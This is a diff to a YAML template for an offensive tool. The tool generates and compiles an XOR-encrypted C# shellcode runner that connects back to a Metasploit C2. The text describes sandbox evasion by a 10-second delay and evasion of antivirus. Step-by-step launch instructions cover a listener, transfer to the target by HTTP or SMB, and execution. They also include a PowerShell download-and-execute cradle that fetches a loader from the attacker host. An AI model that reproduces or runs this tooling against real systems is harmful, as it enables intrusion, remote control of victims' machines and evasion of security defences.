@@ -1,33 +1,32 @@
 meta:
-  name: "XOR-Encrypted Remote Process Injector (C#)"
-  category: "Process Injection"
+  name: "Simple Shellcode Runner, XOR (C#)"
+  category: "Shellcode Execution"
   description: |
-    Generates XOR-encrypted shellcode and performs classic remote process injection.
-
+    Simple shellcode runner in C# with XOR encryption and sandbox evasion.
+    
     Features:
     - XOR encryption for basic obfuscation (key: 0xfa)
-    - NUMA-based sandbox detection
-    - Automatic target selection based on privilege level
-    - Classic CreateRemoteThread injection technique
-
-    The injector opens a target process, allocates executable memory, writes
-    the decoded shellcode, and creates a remote thread to execute it.
-
+    - Sleep-based sandbox detection (10 second delay)
+    - Direct shellcode execution via VirtualAlloc + CreateThread
+    - Minimal API footprint
+    
+    This is a straightforward runner suitable for initial access or testing.
+    The sleep-based evasion helps bypass automated sandboxes that skip delays.
+    
     WARNING: For authorized security testing only!
 
   effectiveness: medium
 
   mitre:
-    tactic: "TA0005 - Defense Evasion"
-    technique: "T1055.001 - Process Injection: Dynamic-link Library Injection"
+    tactic: "TA0002 - Execution"
+    technique: "T1059.003 - Command and Scripting Interpreter: Windows Command Shell"
 
   artifacts:
-    - "OpenProcess API calls with PROCESS_ALL_ACCESS"
-    - "VirtualAllocEx with PAGE_EXECUTE_READWRITE permissions"
-    - "WriteProcessMemory API calls"
-    - "CreateRemoteThread API calls"
+    - "VirtualAlloc with PAGE_EXECUTE_READWRITE"
+    - "CreateThread API calls"
+    - "10-second sleep before execution"
+    - "XOR-decoded shellcode in memory"
     - "Network connection to C2 server"
-    - "Suspicious memory regions in target process"
 
 parameters:
   - name: "lhost"
@@ -41,18 +40,6 @@ parameters:
     required: true
     default: 443
 
-  - name: "default_target"
-    type: "string"
-    description: "Default target process for non-elevated execution"
-    required: false
-    default: "explorer"
-
-  - name: "elevated_target"
-    type: "string"
-    description: "Target process when running with administrative privileges"
-    required: false
-    default: "spoolsv"
-
   - name: "xor_key"
     type: "hex"
     description: "XOR encryption key (single byte, e.g., 'fa')"
@@ -63,7 +50,7 @@ parameters:
     type: "string"
     description: "Output executable filename"
     required: false
-    default: "injector.exe"
+    default: "runner.exe"
 
   - name: "output_path"
     type: "path"
@@ -99,12 +86,12 @@ preprocessing:
 
 output:
   type: "template"
-  template: "process_injection/xor_remote_inject.cs"
+  template: "shellcode_runner/simple_runner.cs"
   compile:
     enabled: true
-    command: "mcs -out:{{ output_path }}/{{ output_file }} {{ source_file }}"
+    command: "mcs -out:{{ output_path }}/{{ output_file }} -platform:x64 -unsafe {{ source_file }}"
   launch_instructions: |
-    XOR-Encrypted Remote Process Injection - Launch Instructions
+    C# Simple XOR Shellcode Runner - Launch Instructions
 
     Step 1: Start Metasploit Listener
 
@@ -125,23 +112,23 @@ output:
 
     Transfer the generated executable to the target Windows system:
 
-    Using Python HTTP server
+    Using Python HTTP server:
     python3 -m http.server 8080
 
     On target (PowerShell):
     Invoke-WebRequest -Uri "http://{{ lhost }}:8080/{{ output_file }}" -OutFile "{{ output_file }}"
 
+    Or using SMB:
+    impacket-smbserver share . -smb2support
+    On target: copy \\{{ lhost }}\share\{{ output_file }} {{ output_file }}
+
     Step 3: Execute on Target
 
-    Option A: Auto-injection (privilege-aware)
-    Simply run without arguments - automatically selects target based on privileges:
+    Simply run the executable:
     {{ output_file }}
 
-    Option B: Specify target process
-    Inject into a specific process by name:
-    {{ output_file }} explorer
-    {{ output_file }} notepad
-    {{ output_file }} svchost
+    Or via PowerShell:
+    Start-Process {{ output_file }}
 
     Step 4: Verify Connection
 
@@ -152,17 +139,22 @@ output:
     Notes:
 
     - Encrypted with XOR key 0x{{ xor_key }} for basic AV evasion
-    - Includes NUMA-based sandbox detection
-    - Auto-selects target: {{ elevated_target }} (elevated) or {{ default_target }} (normal)
-    - Creates remote thread in target process
-    - EXITFUNC=thread ensures clean exit without crashing target process
+    - Includes 10-second sleep for sandbox evasion
+    - Uses VirtualAlloc with RWX permissions
+    - Executes shellcode in separate thread
+    - EXITFUNC=thread ensures clean exit
 
     Troubleshooting:
 
-    - If injection fails: Try different target process (notepad, chrome, etc.)
     - If no connection: Check firewall rules on attacker machine
     - If AV blocks: Consider additional obfuscation or packing
-    - Requires matching architecture (x64 payload for x64 process)
+    - Payload waits 10 seconds before execution (sandbox evasion)
+    - Requires x64 Windows system
+
+    Alternative Execution:
+
+    Run from memory (no file drop):
+    powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://{{ lhost }}:8080/loader.ps1')"
 
     Cleanup:
 
